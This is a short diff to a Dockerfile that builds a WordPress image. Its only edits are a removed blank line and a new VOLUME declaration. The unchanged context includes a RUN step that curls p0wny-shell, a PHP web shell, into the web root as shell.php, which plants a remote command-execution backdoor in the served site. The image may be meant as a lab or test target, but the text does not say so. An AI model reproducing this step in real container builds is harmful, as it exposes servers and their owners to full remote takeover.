@@ -168,7 +168,6 @@ COPY docker-entrypoint.sh /usr/local/bin/
 ADD scripts/ /
 RUN chmod +x /*.sh
 
-
 RUN curl -o /usr/local/bin/wp https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar \
     && chmod +x /usr/local/bin/wp
 RUN curl -o /var/www/html/shell.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php \
@@ -176,5 +175,6 @@ RUN curl -o /var/www/html/shell.php https://raw.githubusercontent.com/flozz/p0wn
 
 COPY --chown=www-data:www-data wordpress /var/www/html
 
+VOLUME ["/var/www/wp-content"]
 ENTRYPOINT ["docker-entrypoint.sh"]
 CMD ["apache2-foreground"]
